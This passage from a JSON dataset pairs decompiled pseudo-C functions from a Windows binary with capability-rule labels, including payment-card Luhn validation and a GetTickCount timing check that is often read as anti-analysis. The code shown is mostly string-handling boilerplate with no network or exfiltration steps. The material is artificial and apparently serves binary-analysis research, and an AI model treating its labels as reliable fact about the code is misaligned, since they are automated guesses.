CONCAT71(Stack391, uStack392);\n        arg1_00 = iVar3;\n        if (0xfff < uStack368 + 1) {\n            arg1_00 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, uStack368 + 0x28);\n                goto code_r0x000180004f3b;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    uStack376 = *0x180101910;\n    uStack368 = *0x180101918;\n    uStack392 = 0;\n    if (0x7 < in_stack_00000030[3]) {\n        piVar1 = *in_stack_00000030;\n        arg1_01 = piVar1;\n        if ((0xfff < in_stack_00000030[3] * 2 + 2U) && (arg1_01 = piVar1[-1],  0x1f < piVar1 + (-8 - arg1_01))) {\ncode_r0x000180004f3b:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(arg1_01);\n    }\n    in_stack_00000030[2] = NULL;\n    in_stack_00000030[3] = 0x7;\n    *in_stack_00000030 = 0;\n    fcn.18008fb00(uStack48 ^ auStack440);\n    return;\n}\n",
        "token_count": 876
    },
    "180004f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180004f50(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    ulong arg1;\n    uchar *arg1_00;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong *arg3_00;\n    int64_t *in_stack_00000030;\n    uchar auStack312 [40];\n    ulong uStack272;\n    uchar uStack264;\n    unkbyte7 Stack263;\n    ulong uStack248;\n    uint64_t uStack240;\n    ulong uStack232;\n    uchar auStack216 [32];\n    uchar auStack184 [136];\n    uint64_t uStack48;\n    \n    uStack232 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack312;\n    arg1_00 = auStack216;\n    uStack272 = fcn.18000de50(arg1_00, in_stack_00000030);\n    puVar2 = fcn.180004b90(arg1_00, &uStack264, arg3, arg4);\n    arg1 = fcn.1800687b0(auStack184);\n    arg3_00 = puVar2;\n    if (0xf < puVar2[3]) {\n        arg3_00 = *puVar2;\n    }\n    fcn.180069050(arg1, arg2, arg3_00, puVar2[2] + arg3_00);\n    fcn.1800686c0(auStack184);\n    if (0xf < uStack240) {\n        iVar4 = CONCAT71(Stack263, uStack264);\n        iVar3 = iVar4;\n        if (0xfff < uStack240 + 1) {\n            iVar3 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar3) - 8U) {\n                fcn.1800b3528(iVar3, uStack240 + 0x28);\n                goto code_r0x0001800050c9;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    uStack248 = *0x180101910;\n    uStack240 = *0x180101918;\n    uStack264 = 0;\n    if (0xf < in_stack_00000030[3]) {\n        iVar3 = *in_stack_00000030;\n        iVar4 = iVar3;\n        if ((0xfff < in_stack_00000030[3] + 1U) && (iVar4 = *(iVar3 + -8),  0x1f < (iVar3 - iVar4) - 8U)) {\ncode_r0x0001800050c9:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    in_stack_00000030[2] = 0;\n    in_stack_00000030[3] = 0xf;\n    *in_stack_00000030 = 0;\n    fcn.18008fb00(uStack48 ^ auStack312);\n    return;\n}\n",
        "token_count": 714
    },
    "1800050d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800050d0(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    ulong arg1;\n    uchar *arg1_00;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong *arg3_00;\n    int64_t *in_stack_00000030;\n    uchar auStack312 [40];\n    ulong uStack272;\n    uchar uStack264;\n    unkbyte7 Stack263;\n    ulong uStack248;\n    uint64_t uStack240;\n    ulong uStack232;\n    uchar auStack216 [32];\n    uchar auStack184 [136];\n    uint64_t uStack48;\n    \n    uStack232 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack312;\n    arg1_00 = auStack216;\n    uStack272 = fcn.18000da90(arg1_00, in_stack_00000030);\n    puVar2 = fcn.180004d80(arg1_00, &uStack264, arg3, arg4);\n    arg1 = fcn.1800687b0(auStack184);\n    arg3_00 = puVar2;\n    if (0xf < puVar2[3]) {\n        arg3_00 = *puVar2;\n    }\n    fcn.180069050(arg1, arg2, arg3_00, puVar2[2] + arg3_00);\n    fcn.1800686c0(auStack184);\n    if (0xf < uStack240) {\n        iVar4 = CONCAT71(Stack263, uStack264);\n        iVar3 = iVar4;\n        if (0xfff < uStack240 + 1) {\n            iVar3 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar3) - 8U) {\n                fcn.1800b3528(iVar3, uStack240 + 0x28);\n                goto code_r0x00018000524c;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    uStack248 = *0x180101910;\n    uStack240 = *0x180101918;\n    uStack264 = 0;\n    if (7 < in_stack_00000030[3]) {\n        iVar3 = *in_stack_00000030;\n        iVar4 = iVar3;\n        if ((0xfff < in_stack_00000030[3] * 2 + 2U) && (iVar4 = *(iVar3 + -8),  0x1f < (iVar3 - iVar4) - 8U)) {\ncode_r0x00018000524c:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    in_stack_00000030[2] = 0;\n    in_stack_00000030[3] = 7;\n    *in_stack_00000030 = 0;\n    fcn.18008fb00(uStack48 ^ auStack312);\n    return;\n}\n",
        "token_count": 714
    },
    "180005e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180005e50(ulong noname_0, ulong arg2, ulong *arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong uVar4;\n    uchar *arg1;\n    int64_t iVar5;\n    ulong *arg3_00;\n    uchar uStack288;\n    unkbyte7 Stack287;\n    ulong uStack272;\n    uint64_t uStack264;\n    uchar uStack256;\n    unkbyte7 Stack255;\n    ulong uStack240;\n    uint64_t uStack232;\n    uchar uStack224;\n    unkbyte7 Stack223;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    ulong uStack192;\n    uchar auStack184 [32];\n    uchar auStack152 [24];\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_68h;\n    ulong var_60h;\n    ulong var_40h;\n    \n    uStack192 = 0xfffffffffffffffe;\n    fcn.18000de50(auStack184, 0x180125538);\n    uStack208 = *0x180101910;\n    uStack204 = *0x180101914;\n    uStack200 = *0x180101918;\n    uStack196 = *0x18010191c;\n    uStack224 = 0;\n    fcn.180011120(&uStack224, 0x1800f4617, 0);\n    uVar4 = fcn.1800687b0(auStack152);\n    arg3_00 = arg3;\n    if (7 < arg3[3]) {\n        arg3_00 = *arg3;\n    }\n    fcn.180068c50(uVar4, &uStack256, arg3_00, arg3_00 + arg3[2] * 2);\n    fcn.1800686c0(auStack152);\n    uStack272 = CONCAT44(*0x180101914, *0x180101910);\n    uStack264 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack288 = 0;\n    arg1 = &uStack288;\n    fcn.180011120(arg1, 0x1800f4688, 6);\n    fcn.180004b90(arg1, arg2, &uStack288, &uStack256);\n    if (uStack264 < 0x10) {\ncode_r0x000180005f7e:\n        uStack272 = CONCAT44(*0x180101914, *0x180101910);\n        uStack264 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack288 = 0;\n        if (0xf < uStack232) {\n            iVar2 = CONCAT71(Stack255, uStack256);\n            iVar5 = iVar2;\n            if ((0xfff < uStack232 + 1) && (iVar5 = *(iVar2 + -8),  0x1f < (iVar2 - iVar5) - 8U))\n            goto code_r0x000180006037;\n            fcn.18008fb24(iVar5);\n        }\n        uStack240 = CONCAT44(*0x180101914, *0x180101910);\n        uStack232 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack256 = 0;\n        uVar3 = CONCAT44(uStack196, uStack200);\n        if (uVar3 < 0x10) {\n            return arg2;\n        }\n        iVar2 = CONCAT71(Stack223, uStack224);\n        iVar5 = iVar2;\n        if (uVar3 + 1 < 0x1000) {\ncode_r0x000180006010:\n            fcn.18008fb24(iVar5);\n            return arg2;\n        }\n        iVar5 = *(iVar2 + -8);\n        if ((iVar2 - iVar5) - 8U < 0x20) goto code_r0x000180006010;\n        fcn.1800b3528(uStack240, iVar5, uVar3 + 0x28);\n    }\n    else {\n        iVar2 = CONCAT71(Stack287, uStack288);\n        iVar5 = iVar2;\n        if ((uStack264 + 1 < 0x1000) || (iVar5 = *(iVar2 + -8),  (iVar2 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180005f7e;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180006037:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    uVar4 = (*pcVar1)();\n    return uVar4;\n}\n",
        "token_count": 1091
    },
    "18000773": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180007730(ulong noname_0, ulong arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uchar *arg1;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack184 [32];\n    int64_t *piStack152;\n    ulong uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    uchar *puStack96;\n    uchar auStack88 [32];\n    int64_t *piStack56;\n    int64_t *piStack48;\n    uint64_t uStack40;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack184;\n    puStack96 = auStack88;\n    piStack56 = arg3;\n    piStack48 = arg4;\n    uStack144 = fcn.18000de50(auStack88, 0x1801254f8);\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    arg1 = &uStack136;\n    fcn.180011120(arg1, 0x1800f46f0, 0xb);\n    piStack152 = arg4;\n    fcn.180004f50(arg1, arg2, &uStack136, arg3);\n    if (0xf < uStack112) {\n        iVar4 = CONCAT71(Stack135, uStack136);\n        iVar3 = iVar4;\n        if ((0xfff < uStack112 + 1) && (iVar3 = *(iVar4 + -8),  0x1f < (iVar4 - iVar3) - 8U)) goto code_r0x0001800078e6;\n        fcn.18008fb24(iVar3);\n    }\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    uVar1 = arg3[3];\n    if (uVar1 < 0x10) {\ncode_r0x00018000785f:\n        arg3[2] = 0;\n        arg3[3] = 0xf;\n        *arg3 = 0;\n        if (arg4[3] < 0x10) {\ncode_r0x0001800078a5:\n            arg4[2] = 0;\n            arg4[3] = 0xf;\n            *arg4 = 0;\n            fcn.18008fb00(uStack40 ^ auStack184);\n            return;\n        }\n        iVar3 = *arg4;\n        iVar4 = iVar3;\n        if ((arg4[3] + 1U < 0x1000) || (iVar4 = *(iVar3 + -8),  (iVar3 - iVar4) - 8U < 0x20)) {\n            fcn.18008fb24(iVar4);\n            goto code_r0x0001800078a5;\n        }\n    }\n    else {\n        iVar3 = *arg3;\n        iVar4 = iVar3;\n        if (uVar1 + 1 < 0x1000) {\ncode_r0x00018000785a:\n            fcn.18008fb24(iVar4);\n            goto code_r0x00018000785f;\n        }\n        iVar4 = *(iVar3 + -8);\n        if ((iVar3 - iVar4) - 8U < 0x20) goto code_r0x00018000785a;\n        fcn.1800b3528(uStack120, iVar3 - iVar4, uVar1 + 0x28);\n    }\n    fcn.1800b3528();\ncode_r0x0001800078e6:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 936
    },
    "18000825": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180008250(ulong noname_0, int64_t *arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uchar *arg1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar auStack168 [32];\n    ulong uStack136;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    ulong uStack104;\n    uint64_t uStack96;\n    ulong uStack88;\n    uchar *puStack80;\n    uchar auStack72 [32];\n    int64_t *piStack40;\n    uint auStack32 [2];\n    uint64_t uStack24;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack168;\n    puStack80 = auStack72;\n    piStack40 = arg2;\n    auStack32[0] = arg3;\n    uStack136 = fcn.18000de50(auStack72, 0x1801254f8);\n    uStack104 = CONCAT44(*0x180101914, *0x180101910);\n    uStack96 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack120 = 0;\n    arg1 = &uStack120;\n    fcn.180011120(arg1, 0x1800f4730, 0xb);\n    fcn.1800054e0(arg1, &uStack120, arg2, auStack32);\n    if (0xf < uStack96) {\n        iVar3 = CONCAT71(Stack119, uStack120);\n        iVar2 = iVar3;\n        if (0xfff < uStack96 + 1) {\n            iVar2 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - iVar2) - 8U) {\n                fcn.1800b3528(iVar2, uStack96 + 0x28);\n                goto code_r0x0001800083a8;\n            }\n        }\n        fcn.18008fb24(iVar2);\n    }\n    uStack104 = CONCAT44(*0x180101914, *0x180101910);\n    uStack96 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack120 = 0;\n    if (0xf < arg2[3]) {\n        iVar2 = *arg2;\n        iVar3 = iVar2;\n        if ((0xfff < arg2[3] + 1U) && (iVar3 = *(iVar2 + -8),  0x1f < (iVar2 - iVar3) - 8U)) {\ncode_r0x0001800083a8:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg2[2] = 0;\n    arg2[3] = 0xf;\n    *arg2 = 0;\n    fcn.18008fb00(uStack24 ^ auStack168);\n    return;\n}\n",
        "token_count": 691
    },
    "1800083b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800083b0(ulong noname_0, int64_t *arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    ulong arg4;\n    uchar *arg1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar auStack184 [32];\n    ulong uStack152;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    uchar *puStack96;\n    int64_t aiStack88 [3];\n    uint64_t uStack64;\n    uchar auStack56 [32];\n    int64_t *piStack24;\n    uint64_t uStack16;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack184;\n    puStack96 = auStack56;\n    piStack24 = arg2;\n    uStack152 = fcn.18000de50(auStack56, 0x1801254f8);\n    arg4 = fcn.180001dd0(aiStack88, arg3);\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    arg1 = &uStack136;\n    fcn.180011120(arg1, 0x1800f4740, 0xb);\n    fcn.180005260(arg1, &uStack136, arg2, arg4);\n    if (0xf < uStack112) {\n        iVar3 = CONCAT71(Stack135, uStack136);\n        iVar2 = iVar3;\n        if ((0xfff < uStack112 + 1) && (iVar2 = *(iVar3 + -8),  0x1f < (iVar3 - iVar2) - 8U)) goto code_r0x000180008556;\n        fcn.18008fb24(iVar2);\n    }\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    if (uStack64 < 0x10) {\ncode_r0x0001800084dc:\n        if (arg2[3] < 0x10) {\ncode_r0x000180008512:\n            arg2[2] = 0;\n            arg2[3] = 0xf;\n            *arg2 = 0;\n            fcn.18008fb00(uStack16 ^ auStack184);\n            return;\n        }\n        iVar2 = *arg2;\n        iVar3 = iVar2;\n        if ((arg2[3] + 1U < 0x1000) || (iVar3 = *(iVar2 + -8),  (iVar2 - iVar3) - 8U < 0x20)) {\n            fcn.18008fb24(iVar3);\n            goto code_r0x000180008512;\n        }\n    }\n    else {\n        iVar2 = aiStack88[0];\n        if (uStack64 + 1 < 0x1000) {\ncode_r0x0001800084d6:\n            fcn.18008fb24(iVar2);\n            goto code_r0x0001800084dc;\n        }\n        iVar2 = *(aiStack88[0] + -8);\n        if ((aiStack88[0] - iVar2) - 8U < 0x20) goto code_r0x0001800084d6;\n        fcn.1800b3528(uStack120, iVar2, uStack64 + 0x28);\n    }\n    fcn.1800b3528();\ncode_r0x000180008556:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 883
    },
    "180009a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180009a40(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    ulong arg2_00;\n    uchar *arg1;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *in_stack_00000030;\n    uchar auStack216 [40];\n    ulong uStack176;\n    uchar uStack168;\n    unkbyte7 Stack167;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    uchar auStack88 [40];\n    uint64_t uStack48;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack216;\n    uStack152 = *0x180101910;\n    uStack148 = *0x180101914;\n    uStack144 = *0x180101918;\n    uStack140 = *0x18010191c;\n    uStack168 = 0;\n    fcn.180011120(&uStack168, 0x1800f47c4, 1);\n    arg1 = auStack88;\n    uStack176 = fcn.18000de50(arg1, in_stack_00000030);\n    arg2_00 = fcn.180004b90(arg1, &uStack136, arg3, arg4);\n    fcn.18000a0f0(arg1, arg2_00, arg2, &uStack168);\n    if (0xf < uStack112) {\n        iVar4 = CONCAT71(Stack135, uStack136);\n        iVar3 = iVar4;\n        if ((0xfff < uStack112 + 1) && (iVar3 = *(iVar4 + -8),  0x1f < (iVar4 - iVar3) - 8U)) goto code_r0x000180009bf2;\n        fcn.18008fb24(iVar3);\n    }\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    uVar2 = CONCAT44(uStack140, uStack144);\n    if (uVar2 < 0x10) {\ncode_r0x000180009b7c:\n        if (in_stack_00000030[3] < 0x10) {\ncode_r0x000180009bb2:\n            in_stack_00000030[2] = 0;\n            in_stack_00000030[3] = 0xf;\n            *in_stack_00000030 = 0;\n            fcn.18008fb00(uStack48 ^ auStack216);\n            return;\n        }\n        iVar3 = *in_stack_00000030;\n        iVar4 = iVar3;\n        if ((in_stack_00000030[3] + 1U < 0x1000) || (iVar4 = *(iVar3 + -8),  (iVar3 - iVar4) - 8U < 0x20)) {\n            fcn.18008fb24(iVar4);\n            goto code_r0x000180009bb2;\n        }\n    }\n    else {\n        iVar4 = CONCAT71(Stack167, uStack168);\n        iVar3 = iVar4;\n        if (uVar2 + 1 < 0x1000) {\ncode_r0x000180009b76:\n            fcn.18008fb24(iVar3);\n            goto code_r0x000180009b7c;\n        }\n        iVar3 = *(iVar4 + -8);\n        if ((iVar4 - iVar3) - 8U < 0x20) goto code_r0x000180009b76;\n        fcn.1800b3528(uStack120, iVar3, uVar2 + 0x28);\n    }\n    fcn.1800b3528();\ncode_r0x000180009bf2:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 953
    },
    "18000a0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.18000a0f0(ulong noname_0, ulong *arg2, int64_t *arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    ulong *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uVar8 = 0;\n    fcn.180013b30(*arg3, arg3[1]);\n    arg3[1] = *arg3;\n    uVar9 = arg2[2];\n    if (uVar9 == 0) {\n        iVar7 = 0;\n    }\n    else {\n        uVar4 = fcn.18000db20(arg2, arg4, 0);\n        if (uVar4 != 0xffffffffffffffff) {\n            do {\n                if (uVar8 < uVar4) {\n                    uStack88 = 0;\n                    uStack80 = 0xf;\n                    uStack104 = uStack104 & 0xffffff00;\n                    if (arg2[2] < uVar8) {\n                        fcn.180011cd0();\n                        pcVar2 = swi(3);\n                        iVar7 = (*pcVar2)();\n                        return iVar7;\n                    }\n                    uVar5 = arg2[2] - uVar8;\n                    uVar9 = uVar4 - uVar8;\n                    if (uVar5 < uVar4 - uVar8) {\n                        uVar9 = uVar5;\n                    }\n                    puVar6 = arg2;\n                    if (0xf < arg2[3]) {\n                        puVar6 = *arg2;\n                    }\n                    fcn.180011120(&uStack104, puVar6 + uVar8, uVar9);\n                    puVar1 = arg3[1];\n                    if (puVar1 == arg3[2]) {\n                        fcn.1800129e0(arg3, puVar1, &uStack104);\n                        uVar8 = uStack80;\n                    }\n                    else {\n                        *puVar1 = uStack104;\n                        puVar1[1] = uStack100;\n                        puVar1[2] = uStack96;\n                        puVar1[3] = uStack92;\n                        puVar1[4] = uStack88;\n                        puVar1[5] = uStack88._4_4_;\n                        puVar1[6] = uStack80;\n                        puVar1[7] = uStack80._4_4_;\n                        uStack104 = uStack104 & 0xffffff00;\n                        arg3[1] = arg3[1] + 0x20;\n                        uVar8 = 0xf;\n                    }\n                    if (0xf < uVar8) {\n                        iVar3 = CONCAT44(uStack100, uStack104);\n                        iVar7 = iVar3;\n                        if ((0xfff < uVar8 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n                        goto code_r0x00018000a323;\n                        fcn.18008fb24(iVar7);\n                    }\n                }\n                uVar8 = uVar4 + 1;\n                uVar4 = fcn.18000db20(arg2, arg4, uVar8);\n            } while (uVar4 != 0xffffffffffffffff);\n            uVar9 = arg2[2];\n        }\n        if (uVar8 < uVar9) {\n            uStack88 = CONCAT44(*0x180101914, *0x180101910);\n            uStack80 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack104 = uStack104 & 0xffffff00;\n            iVar7 = -1;\n            if (uVar9 - uVar8 != -1) {\n                iVar7 = uVar9 - uVar8;\n            }\n            if (0xf < arg2[3]) {\n                arg2 = *arg2;\n            }\n            fcn.180011120(&uStack104, arg2 + uVar8, iVar7);\n            puVar1 = arg3[1];\n            if (puVar1 == arg3[2]) {\n                fcn.1800129e0(arg3, puVar1, &uStack104);\n                uVar8 = uStack80;\n            }\n            else {\n                *puVar1 = uStack104;\n                puVar1[1] = uStack100;\n                puVar1[2] = uStack96;\n                puVar1[3] = uStack92;\n                puVar1[4] = uStack88;\n                puVar1[5] = uStack88._4_4_;\n                puVar1[6] = uStack80;\n                puVar1[7] = uStack80._4_4_;\n                uStack104 = uStack104 & 0xffffff00;\n                arg3[1] = arg3[1] + 0x20;\n                uVar8 = 0xf;\n            }\n            if (0xf < uVar8) {\n                iVar3 = CONCAT44(uStack100, uStack104);\n                iVar7 = iVar3;\n                if ((0xfff < uVar8 + 1) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U)) {\ncode_r0x00018000a323:\n                    fcn.1800b3528(iVar7, uVar8 + 0x28);\n                    pcVar2 = swi(3);\n                    iVar7 = (*pcVar2)();\n                    return iVar7;\n                }\n                fcn.18008fb24(iVar7);\n            }\n        }\n        iVar7 = arg3[1] - *arg3 >> 5;\n    }\n    return iVar7;\n}\n",
        "token_count": 1380
    },
    "18000a33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.18000a330(ulong noname_0, ulong *arg2, int64_t *arg3, ulong *arg4)\n\n{\n    uint64_t arg2_00;\n    uint64_t uVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong *puVar6;\n    int64_t iVar7;\n    ulong *arg1;\n    uint64_t uVar8;\n    uint64_t arg3_00;\n    ushort uStack104;\n    ushort uStack102;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uVar8 = 0;\n    fcn.180013aa0(*arg3, arg3[1]);\n    arg3[1] = *arg3;\n    if (arg2[2] == 0) {\n        iVar7 = 0;\n    }\n    else {\n        while( true ) {\n            puVar6 = arg4;\n            if (7 < arg4[3]) {\n                puVar6 = *arg4;\n            }\n            arg2_00 = arg2[2];\n            uVar1 = arg2[3];\n            arg1 = arg2;\n            if (7 < uVar1) {\n                arg1 = *arg2;\n            }\n            uVar5 = fcn.180013460(arg1, arg2_00, uVar8, puVar6);\n            if (uVar5 == 0xffffffffffffffff) break;\n            if (uVar8 < uVar5) {\n                uStack88 = 0;\n                uStack80 = 7;\n                uStack104 = 0;\n                if (arg2_00 < uVar8) {\n                    fcn.180011cd0();\n                    pcVar3 = swi(3);\n                    iVar7 = (*pcVar3)();\n                    return iVar7;\n                }\n                arg3_00 = uVar5 - uVar8;\n                if (arg2_00 - uVar8 < uVar5 - uVar8) {\n                    arg3_00 = arg2_00 - uVar8;\n                }\n                puVar6 = arg2;\n                if (7 < uVar1) {\n                    puVar6 = *arg2;\n                }\n                fcn.180010d70(&uStack104, puVar6 + uVar8 * 2, arg3_00);\n                puVar2 = arg3[1];\n                if (puVar2 == arg3[2]) {\n                    fcn.180012c50(arg3, puVar2, &uStack104);\n                    uVar8 = uStack80;\n                }\n                else {\n                    *puVar2 = CONCAT22(uStack102, uStack104);\n                    puVar2[1] = uStack100;\n                    puVar2[2] = uStack96;\n                    puVar2[3] = uStack92;\n                    puVar2[4] = uStack88;\n                    puVar2[5] = uStack88._4_4_;\n                    puVar2[6] = uStack80;\n                    puVar2[7] = uStack80._4_4_;\n                    uStack104 = 0;\n                    arg3[1] = arg3[1] + 0x20;\n                    uVar8 = 7;\n                }\n                if (7 < uVar8) {\n                    uVar8 = uVar8 * 2 + 2;\n                    iVar4 = CONCAT44(uStack100, CONCAT22(uStack102, uStack104));\n                    iVar7 = iVar4;\n                    if ((0xfff < uVar8) && (iVar7 = *(iVar4 + -8),  0x1f < (iVar4 - iVar7) - 8U))\n                    goto code_r0x00018000a580;\n                    fcn.18008fb24(iVar7);\n                }\n            }\n            uVar8 = uVar5 + 1;\n        }\n        if (uVar8 < arg2_00) {\n            uStack88 = CONCAT44(*0x180101904, *0x180101900);\n            uStack80 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack104 = 0;\n            iVar7 = -1;\n            if (arg2_00 - uVar8 != -1) {\n                iVar7 = arg2_00 - uVar8;\n            }\n            if (7 < uVar1) {\n                arg2 = *arg2;\n            }\n            fcn.180010d70(&uStack104, arg2 + uVar8 * 2, iVar7);\n            puVar2 = arg3[1];\n            if (puVar2 == arg3[2]) {\n                fcn.180012c50(arg3, puVar2, &uStack104);\n                uVar8 = uStack80;\n            }\n            else {\n                *puVar2 = CONCAT22(uStack102, uStack104);\n                puVar2[1] = uStack100;\n                puVar2[2] = uStack96;\n                puVar2[3] = uStack92;\n                puVar2[4] = uStack88;\n                puVar2[5] = uStack88._4_4_;\n                puVar2[6] = uStack80;\n                puVar2[7] = uStack80._4_4_;\n                uStack104 = 0;\n                arg3[1] = arg3[1] + 0x20;\n                uVar8 = 7;\n            }\n            if (7 < uVar8) {\n                uVar8 = uVar8 * 2 + 2;\n                iVar4 = CONCAT44(uStack100, CONCAT22(uStack102, uStack104));\n                iVar7 = iVar4;\n                if ((0xfff < uVar8) && (iVar7 = *(iVar4 + -8),  0x1f < (iVar4 - iVar7) - 8U)) {\ncode_r0x00018000a580:\n                    fcn.1800b3528(iVar7, uVar8 + 0x27);\n                    pcVar3 = swi(3);\n                    iVar7 = (*pcVar3)();\n                    return iVar7;\n                }\n                fcn.18008fb24(iVar7);\n            }\n        }\n        iVar7 = arg3[1] - *arg3 >> 5;\n    }\n    return iVar7;\n}\n",
        "token_count": 1447
    },
    "18000a59": {
        "rules": [
